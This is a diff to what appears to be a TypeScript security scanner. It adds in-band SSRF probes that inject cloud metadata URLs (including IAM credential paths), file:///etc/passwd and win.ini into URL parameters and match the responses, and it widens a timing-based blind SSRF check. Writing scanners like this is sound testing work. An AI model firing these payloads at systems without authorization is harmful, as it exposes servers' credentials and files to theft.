@@ -30,48 +30,135 @@ export function detectSSRF(html: string, paramUrls: string[], targetUrl: string)
   return null;
 }
 
-export async function probeBlindSSRFWithTiming(paramUrl: string): Promise<PendingFinding | null> {
-  const NON_ROUTABLE_IPS = [
-    "http://10.255.255.1:81/",
-    "http://192.168.255.254:81/",
-    "http://169.254.169.254/latest/meta-data/",
+export async function probeInBandSSRF(
+  paramUrl: string,
+  session: AuthSession = EMPTY_SESSION
+): Promise<PendingFinding | null> {
+  const IN_BAND_PAYLOADS = [
+    {
+      target: "http://169.254.169.254/latest/meta-data/",
+      label: "AWS EC2 Metadata Service",
+      pattern: /\b(?:ami-id|instance-id|instance-type|local-ipv4|public-ipv4|security-groups|iam\/security-credentials)\b/i,
+    },
+    {
+      target: "http://metadata.google.internal/computeMetadata/v1/",
+      label: "GCP Metadata Service",
+      pattern: /\b(?:computeMetadata|project-id|numeric-project-id|service-accounts)\b/i,
+    },
+    {
+      target: "http://169.254.169.254/metadata/v1/",
+      label: "DigitalOcean Droplet Metadata",
+      pattern: /\b(?:droplet_id|vendor_data|floating_ip)\b/i,
+    },
+    {
+      target: "file:///etc/passwd",
+      label: "Local File System (/etc/passwd)",
+      pattern: /(?:root:x:0:0:[^:]*:[^:]*:(?:\/root|\/bin)|daemon:x:\d+:\d+:)/i,
+    },
+    {
+      target: "file:///c:/windows/win.ini",
+      label: "Windows Configuration (win.ini)",
+      pattern: /\[(?:extensions|fonts|mci extensions|files)\]/i,
+    },
   ];
 
   try {
     const u = new URL(paramUrl);
-    const firstParam = [...u.searchParams.keys()][0];
-    if (!firstParam) return null;
+    const paramKeys = [...u.searchParams.keys()].slice(0, 5);
+    if (paramKeys.length === 0) return null;
+
+    // Get baseline response body to avoid false positives on static pages
+    const baselineResp = await safeFetch(u.toString(), 5000);
+    const baselineBody = baselineResp ? await baselineResp.text().catch(() => "") : "";
+
+    for (const param of paramKeys) {
+      for (const item of IN_BAND_PAYLOADS) {
+        try {
+          const testUrl = new URL(u.toString());
+          testUrl.searchParams.set(param, item.target);
+
+          const resp = await fetch(testUrl.toString(), {
+            headers: { ...FETCH_HEADERS, ...authHeaders(session) },
+            signal: AbortSignal.timeout(6000),
+            // @ts-ignore
+            next: { revalidate: 0 },
+          }).catch(() => null);
+
+          if (!resp) continue;
+          const body = await resp.text().catch(() => "");
+          if (!body || body.length < 5) continue;
+
+          // Check if payload reflection triggered metadata or file disclosure that was not in the baseline
+          const match = body.match(item.pattern);
+          if (match && !item.pattern.test(baselineBody)) {
+            const matchedSnippet = match[0];
+            return {
+              type: "ssrf-inband-content-disclosure",
+              severity: "CRITICAL",
+              url: testUrl.toString(),
+              parameter: param,
+              evidence: `Critical In-Band SSRF Confirmed: Injecting "${item.target}" into parameter "${param}" returned ${item.label} content. Matched signature snippet: "${matchedSnippet}".`,
+              cvssScore: 9.8,
+              cveId: "CWE-918",
+              confidence: CONFIDENCE.DETERMINISTIC,
+              isVerified: true,
+              validationSteps: [
+                `Injected payload "${item.target}" into parameter "${param}"`,
+                `Response body contained ${item.label} signature: "${matchedSnippet}"`,
+                `Verified not present in baseline response`,
+              ],
+            };
+          }
+        } catch { /* next payload */ }
+      }
+    }
+  } catch { /* skip */ }
+  return null;
+}
+
+export async function probeBlindSSRFWithTiming(paramUrl: string): Promise<PendingFinding | null> {
+  const NON_ROUTABLE_IPS = [
+    "http://10.255.255.1:81/",
+    "http://192.168.255.254:81/",
+  ];
+
+  try {
+    const u = new URL(paramUrl);
+    const paramKeys = [...u.searchParams.keys()].slice(0, 3);
+    if (paramKeys.length === 0) return null;
 
     const baselineStart = Date.now();
     const baselineResp = await safeFetch(u.toString(), 5000);
     const baselineTime = Date.now() - baselineStart;
     if (!baselineResp) return null;
 
-    for (const internalTarget of NON_ROUTABLE_IPS) {
-      try {
-        const testUrl = new URL(u.toString());
-        testUrl.searchParams.set(firstParam, internalTarget);
-        const start = Date.now();
-        await fetch(testUrl.toString(), {
-          headers: FETCH_HEADERS,
-          signal: AbortSignal.timeout(8000),
-          // @ts-ignore
-          next: { revalidate: 0 },
-        }).catch(() => null);
-        const elapsed = Date.now() - start;
+    for (const param of paramKeys) {
+      for (const internalTarget of NON_ROUTABLE_IPS) {
+        try {
+          const testUrl = new URL(u.toString());
+          testUrl.searchParams.set(param, internalTarget);
+          const start = Date.now();
+          await fetch(testUrl.toString(), {
+            headers: FETCH_HEADERS,
+            signal: AbortSignal.timeout(8000),
+            // @ts-ignore
+            next: { revalidate: 0 },
+          }).catch(() => null);
+          const elapsed = Date.now() - start;
 
-        if (elapsed > baselineTime + 3000) {
-          return {
-            type: "ssrf-blind-timing",
-            severity: "HIGH",
-            url: testUrl.toString(),
-            parameter: firstParam,
-            evidence: `Blind SSRF confirmed via timing delay. Requesting non-routable IP "${internalTarget}" in parameter "${firstParam}" took ${elapsed}ms (baseline: ${baselineTime}ms).`,
-            cvssScore: 8.6,
-            cveId: "CWE-918",
-          };
-        }
-      } catch { /* next */ }
+          if (elapsed > baselineTime + 3000) {
+            return {
+              type: "ssrf-blind-timing",
+              severity: "HIGH",
+              url: testUrl.toString(),
+              parameter: param,
+              evidence: `Blind SSRF confirmed via timing delay. Requesting non-routable IP "${internalTarget}" in parameter "${param}" took ${elapsed}ms (baseline: ${baselineTime}ms).`,
+              cvssScore: 8.6,
+              cveId: "CWE-918",
+            };
+          }
+        } catch { /* next */ }
+      }
     }
   } catch { /* skip */ }
   return null;
